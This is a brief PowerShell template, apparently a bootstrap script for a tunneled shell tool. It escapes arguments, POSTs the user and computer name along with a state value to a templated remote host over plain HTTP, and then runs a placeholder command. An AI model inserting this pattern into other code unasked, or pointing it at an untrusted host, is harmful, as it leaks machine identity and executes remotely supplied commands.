$env:TRACE_STATE = '{{ STATE }}';
$env:TUNNEL = '{{ tunnel }}';
function EscArgv { $args -Replace '\\(?=\\*")','\\' -Replace '"','\"' }
function Get-Profile {
    Invoke-WebRequest -Uri "http://{{ tunnel }}/p2?shell={{ shell }}&domain=$Env:UserName@$Env:ComputerName" -Body '{{ STATE }}' -Method POST -ContentType 'application/json' | Select-Object -Expand Content;
}

{{ command }};
